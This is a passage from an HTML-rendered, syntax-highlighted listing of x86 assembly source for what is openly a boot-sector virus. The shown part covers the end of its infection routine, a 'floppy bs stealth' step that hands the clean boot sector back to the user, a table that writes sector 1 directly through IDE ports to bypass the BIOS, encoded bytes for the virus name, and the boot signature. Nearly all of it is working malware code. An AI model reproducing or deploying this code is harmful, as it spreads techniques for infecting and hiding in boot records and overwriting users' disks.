                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">301h</span><span class="sc0">                 </span><span class="sc1">; write it to the buffer</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">                    </span><span class="sc1">; on the disk... this is</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                    </span><span class="sc1">; what will be returned</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">13h</span><span class="sc0">                     </span><span class="sc1">; also to the user</span><span class="sc0">
                                                </span><span class="sc1">; this is floppy bs stealth</span><span class="sc0">
                </span><span class="sc6">popa</span><span class="sc0">

</span><span class="sc5">exit_infect</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">
                </span><span class="sc6">pusha</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">202h</span><span class="sc0">                 </span><span class="sc1">; read the two sectors from</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">                    </span><span class="sc1">; our temp disk buffer to</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">                  </span><span class="sc1">; his buffer in ES:BX</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0eah</span><span class="sc0">                    </span><span class="sc1">; jmp far</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">330h</span><span class="sc0">                    </span><span class="sc1">; adress of returning</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc2">00h</span><span class="sc0">                    </span><span class="sc1">; the segment where the virus</span><span class="sc0">
                                                </span><span class="sc1">; resides is always 00h</span><span class="sc0">
</span><span class="sc1">; ide programming sequence</span><span class="sc0">
                </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">                     </span><span class="sc1">; one byte for ide programming</span><span class="sc0">
                                                </span><span class="sc1">; is used directly from the</span><span class="sc0">
                                                </span><span class="sc1">; absolute jump before</span><span class="sc0">
</span><span class="sc5">ide_prog</span><span class="sc4">:</span><span class="sc0">
                                </span><span class="sc1">; ฺฤฤฤฤฤฤยฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฟ</span><span class="sc0">
                                </span><span class="sc1">; ณ Port ณ     Effect                     ณ</span><span class="sc0">
                                </span><span class="sc1">; รฤฤฤฤฤฤลฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤด</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc0">    </span><span class="sc1">; ณ 1F1h ณ   Set Precompensation to 0     ณ</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">001h</span><span class="sc0">    </span><span class="sc1">; ณ 1F2h ณ   Set Sector count    to 1     ณ</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">001h</span><span class="sc0">    </span><span class="sc1">; ณ 1F3h ณ   Set Sector number   to 1     ณ</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc0">    </span><span class="sc1">; ณ 1F4h ณ   Set Cylinder high   to 0     ณ</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc0">    </span><span class="sc1">; ณ 1F5h ณ   Set Cylinder low    to 0     ณ</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0A0h</span><span class="sc0">    </span><span class="sc1">; ณ 1F6h ณ   Set Drive to  0,  Head 0     ณ</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">030h</span><span class="sc0">    </span><span class="sc1">; ณ 1F7h ณ   Set Write sector             ณ</span><span class="sc0">
                                </span><span class="sc1">; ภฤฤฤฤฤฤมฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤู</span><span class="sc0">

</span><span class="sc1">; name_stuff are bytes used for the virus name</span><span class="sc0">
</span><span class="sc5">name_stuff</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">070h</span><span class="sc4">,</span><span class="sc2">086h</span><span class="sc4">,</span><span class="sc2">048h</span><span class="sc4">,</span><span class="sc2">06Eh</span><span class="sc4">,</span><span class="sc2">0A6h</span><span class="sc4">,</span><span class="sc2">01Bh</span><span class="sc4">,</span><span class="sc2">0B7h</span><span class="sc4">,</span><span class="sc2">087h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">02ch</span><span class="sc4">,</span><span class="sc2">0A9h</span><span class="sc4">,</span><span class="sc2">0BFh</span><span class="sc4">,</span><span class="sc2">024h</span><span class="sc4">,</span><span class="sc2">041h</span><span class="sc0">

                </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc2">01feh</span><span class="sc0">
</span><span class="sc5">boot_marker</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">55h</span><span class="sc4">,</span><span class="sc2">0AAh</span><span class="sc0">
                </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc2">200h</span><span class="sc0">

                </span><span class="sc9">end</span><span class="sc0">
</span></div></body>
</html>
